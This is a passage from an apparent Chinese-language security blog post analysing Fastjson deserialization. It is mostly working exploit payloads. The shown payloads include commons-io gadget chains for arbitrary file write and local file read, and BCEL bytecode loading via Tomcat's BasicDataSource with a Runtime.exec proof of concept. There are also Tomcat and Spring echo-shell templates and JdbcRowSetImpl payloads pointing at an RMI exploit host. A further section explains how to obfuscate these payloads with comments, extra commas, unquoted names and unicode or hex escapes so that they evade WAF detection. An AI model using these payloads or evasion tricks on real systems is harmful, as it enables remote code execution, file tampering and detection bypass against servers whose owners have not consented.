class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">        <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;start&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;end&quot;</span>:<span class="number">2147483647</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">        <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;trigger3&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inputStream&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>commons-io读取文件</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;abc&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reader&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">                <span class="string">&quot;url&quot;</span>: <span class="string">&quot;file:///D:/1.txt&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;boms&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;bytes&quot;</span>: [<span class="number">66</span>]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h4><p><font style="color:#000000;">利用Tomcat中com.sun.org.apache.bcel.internal.util.ClassLoader#loadclass方法加载bcel字节码，之后调用defineClass进行加载字节码。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Poc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;poc.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">        System.out.println(bytes.length);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;res.txt&quot;</span>));</span><br><span class="line">        bw.write(<span class="string">&quot;$$BCEL$$&quot;</span> + result);</span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>, <span class="comment">// tomcat8的poc，如果小于8的话用到的类是org.apache.tomcat.dbcp.dbcp.BasicDataSource</span></span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以构造Tomcat&#x2F;SpringBoot的回显马。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tomcat Echo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;字节码放入此处&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Spring Echo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;字节码放入此处&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h3><p><font style="color:#000000;">对于WAF设备，可以采用常规的Bypass的手段来进行绕过，例如利用过长字符来使得服务器放行流量；或者结合中间件的解析，例如multipart支持指定Content-Transformer-Encoding，可以使用Base64或quoted-printable（QP编码）来绕过WAF。</font></p><p><font style="color:#000000;">下文着重分析Fastjson在解析过程中的的特性来构造混淆Payload，从而绕过WAF层面的流量检测。</font></p><h4 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h4><p><font style="color:#000000;">在上文分析漏洞流程时，</font><font style="color:#000000;background-color:#ffffff;">skipWhitespace方法多次出现在解析过程中，可以看到会默认去除键、值外的空格、\r、\n、\t、\f、\b等字符。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\r&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\f&#x27;</span> || ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                skipComment();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注释字符"><a href="#注释字符" class="headerlink" title="注释字符"></a>注释字符</h4><p><font style="color:#000000;">在上文的skipWhitespace方法中，可以看到如果当前字符为&#x2F;的话，会调用skipComment方法，可以看到在skipComment方法中，fastjson处理的注释主要有两类，&#x2F;&#x2F;comment\n和&#x2F;<em>comment</em>&#x2F;，因此可以利用注释字符来混淆Payload。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            next();</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">        next();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; ch != EOI;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    next();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            next();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="默认开启的Feature"><a href="#默认开启的Feature" class="headerlink" title="默认开启的Feature"></a>默认开启的Feature</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">features</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    features |= Feature.AutoCloseSource.getMask();</span><br><span class="line">    features |= Feature.InternFieldNames.getMask();</span><br><span class="line">    features |= Feature.UseBigDecimal.getMask();</span><br><span class="line">    features |= Feature.AllowUnQuotedFieldNames.getMask();</span><br><span class="line">    features |= Feature.AllowSingleQuotes.getMask();</span><br><span class="line">    features |= Feature.AllowArbitraryCommas.getMask();</span><br><span class="line">    features |= Feature.SortFeidFastMatch.getMask();</span><br><span class="line">    features |= Feature.IgnoreNotMatch.getMask();</span><br><span class="line">    DEFAULT_PARSER_FEATURE = features;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">AllowUnQuotedFieldNames，允许JSON字段名不被引号包括，只在恢复字段的过程调用当中有效果</font></li></ul><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735042059477-90d803b3-e76e-4114-8d4d-fcf30fc8c9be.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line">-&gt;</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span>dataSourceName<span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">AllowSingleQuotes，允许使用单引号包裹字段名</font></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span>&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;<span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">AllowArbitraryCommas，允许使用多个逗号</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line"><span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        lexer.skipWhitespace();</span><br><span class="line">        ch = lexer.getCurrent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p><font style="color:#000000;">在com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol方法中，如果遇到了\u或者\x，会自动将键与值进行unicode与十六进制解码。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">    <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> ch = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> ch = next();</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">    <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>) x_val;</span><br><span class="line">    hash = <span class="number">31</span> * hash + (<span class="type">int</span>) x_char;</span><br><span class="line">    putChar(x_char);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">    <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span 